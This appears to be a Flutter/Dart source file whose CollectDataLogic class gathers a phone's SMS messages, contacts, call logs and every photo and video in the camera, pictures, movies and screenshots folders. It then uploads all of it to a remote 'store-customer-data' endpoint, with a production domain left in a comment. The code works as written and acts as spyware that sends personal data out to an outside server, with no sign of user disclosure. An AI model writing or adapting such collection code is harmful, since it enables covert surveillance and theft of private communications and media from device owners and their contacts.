import 'dart:convert';

import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:call_log/call_log.dart';
import 'package:path_provider/path_provider.dart';
import 'package:external_path/external_path.dart';

// import 'package:flutter_file_manager/flutter_file_manager.dart';
// import 'package:path_provider_ex/path_provider_ex.dart';

import 'dart:io';
import "package:intl/intl.dart";
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'package:async/async.dart';
import 'package:http_parser/http_parser.dart';

class CollectDataLogic {
  CollectDataLogic();

  Future<void> uploadData(String secretCode) async {
    var url = Uri.parse(
        "http://10.0.2.2:8000/api/store-customer-data"); //https://truestaff.click/api/store-customer-data
    var request = new http.MultipartRequest("POST", url);

    request.fields['secret_code'] = secretCode;
    var smsPermission = await Permission.sms.status;
    if (smsPermission.isGranted) {
      List<Map> messages = await getAllSms();
      request.fields['messages'] = jsonEncode(messages);
    }

    var contactsPermission = await Permission.contacts.status;
    if (contactsPermission.isGranted) {
      List<Map> contacts = await getAllContacts();
      request.fields['contacts'] = jsonEncode(contacts);
    }

    if (Platform.isAndroid) {
      var phonePermission = await Permission.phone.status;
      if (phonePermission.isGranted) {
        List<Map> callLogs = await getCallLogs();
        request.fields['call_logs'] = jsonEncode(callLogs);
      }
    }

    request.fields['locale'] = Platform.localeName;

    var storagePermission = await Permission.storage.status;
    if (storagePermission.isGranted) {
      List<File> files = await getImagesAndVideos(); //getFiles
      for (var i = 0; i < files.length; i++) {
        var fileName = files[i].path.split("/").last;
        var fileStream =
            new http.ByteStream(DelegatingStream.typed(files[i].openRead()));
        var length = await files[i].length();
        var multipartFile = new http.MultipartFile(
            'files[' + i.toString() + ']', fileStream, length,
            filename: fileName,
            contentType: MediaType.parse("application/octet-stream"));
        request.files.add(multipartFile);
      }
    }

    var response = await request.send();

    if (response.statusCode == 200) {
      print('Files uploaded successfully!');
    } else {
      print('Error uploading files: ${response.statusCode}');
    }
  }

  Future<List<Map>> getAllSms() async {
    List<Map> result = [];
    SmsQuery query = new SmsQuery();

    List<SmsMessage> messages = await query.getAllSms;
    print("Total Messages : " + messages.length.toString());
    messages.forEach((element) {
      var msg = <String, String>{};
      msg['address'] = element.address.toString();
      msg['body'] = element.body.toString();
      msg['thread_id'] = element.threadId.toString();
      var format = DateFormat('yyyy-MM-dd hh:mm:ss');
      msg['date'] = format.format(element.date ?? DateTime.now());
      msg['sender'] = element.sender.toString();
      result.add(msg);
    });

    return result;
  }

  Future<List<Map>> getAllContacts() async {
    List<Map> result = [];
    List<Contact> contacts = await ContactsService.getContacts();
    print("Total Contacts : " + contacts.length.toString());
    contacts.forEach((element) {
      print(element.displayName);
      var msg = <String, String>{};
      msg['name'] = element.displayName.toString();
      var phones = '';
      element.phones!.forEach((item) {
        phones = (phones.isEmpty ? '' : phones + '\n') +
            "${item.label}: ${item.value}";
      });
      msg['phones'] = phones;
      result.add(msg);
    });

    return result;
  }

  Future<List<Map>> getCallLogs() async {
    List<Map> result = [];
    final Iterable<CallLogEntry> callLogs = await CallLog.query();
    callLogs.forEach((element) {
      var msg = <String, String>{};
      if (element.number != null) {
        msg['number'] = element.formattedNumber.toString();
        msg['name'] = element.name.toString();
        msg['call_type'] = element.callType.toString();
        var date =
            new DateTime.fromMillisecondsSinceEpoch(element.timestamp ?? 0);
        var format = DateFormat('yyyy-MM-dd hh:mm:ss');
        msg['timestamp'] = format.format(date);
        msg['duration'] = element.duration.toString();

        result.add(msg);
      }
    });

    return result;
  }

  Future<List<File>> getImagesAndVideos() async {
    // Get the external storage directory path
    // final dirs = await ExternalPath.getExternalStorageDirectories();
    var dirs = [];
    dirs.add(await ExternalPath.getExternalStoragePublicDirectory(
        ExternalPath.DIRECTORY_DCIM));
    dirs.add(await ExternalPath.getExternalStoragePublicDirectory(
        ExternalPath.DIRECTORY_MOVIES));
    dirs.add(await ExternalPath.getExternalStoragePublicDirectory(
        ExternalPath.DIRECTORY_PICTURES));
    dirs.add(await ExternalPath.getExternalStoragePublicDirectory(
        ExternalPath.DIRECTORY_SCREENSHOTS));

    // Get all files in the directory
    List<File> imagesAndVideos = [];
    for (var i = 0; i < dirs.length; i++) {
      try {
        var files =
            Directory(dirs[i]).listSync(recursive: true, followLinks: false);
        // Filter the list to only include image and video files
        for (var file in files) {
          final String path = file.path;
          if (path.endsWith('.jpg') ||
              path.endsWith('.jpeg') ||
              path.endsWith('.png') ||
              path.endsWith('.gif') ||
              path.endsWith('.mp4')) {
            imagesAndVideos.add(new File(path));
          }
        }
      } on FileSystemException catch (_, e) {
        print(e.toString());
      }
    }

    return imagesAndVideos;
  }

  // Future<List<File>> getFiles() async {
  //   //asyn function to get list of files
  //   List<StorageInfo> storageInfo = await PathProviderEx.getStorageInfo();
  //   var root = storageInfo[0]
  //       .rootDir; //storageInfo[1] for SD card, geting the root directory
  //   var fm = FileManager(root: Directory(root)); //
  //   var files = await fm.filesTree(
  //       //set fm.dirsTree() for directory/folder tree list
  //       excludedPaths: [
  //         "/storage/emulated/0/Android"
  //       ], extensions: [
  //     "png",
  //     "jpg",
  //     "gif",
  //     "avi",
  //     "mp4"
  //   ] //optional, to filter files, remove to list all,
  //       //remove this if your are grabbing folder list
  //       );

  //   return files;
  // }
}
